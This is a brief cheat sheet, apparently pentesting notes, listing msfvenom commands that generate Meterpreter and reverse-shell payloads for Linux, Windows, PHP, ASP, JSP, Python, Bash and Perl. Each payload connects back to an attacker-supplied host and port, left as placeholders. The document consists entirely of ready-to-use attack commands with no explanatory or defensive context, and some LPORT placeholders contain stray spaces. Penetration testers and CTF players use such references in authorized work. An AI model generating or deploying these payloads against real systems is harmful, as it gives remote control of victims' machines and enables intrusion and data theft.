

### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=Your IP LPORT=Your Port -f elf  -o ./shell.elf
```

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Your IP LPORT= Your Port -f exe -o ./shell.exe
```

### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw -o ./shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Your IP LPORT=Your Port -f asp -o ./shell.asp
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw -o ./shell.jsp
```

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=Your IP LPORT= Your Port -f raw -o ./shell.py
```

### Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=Your IP LPORT= Your Port -f raw -o ./shell.sh
```

### Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=Your IP LPORT= Your Port -f raw -o ./shell.pl
```

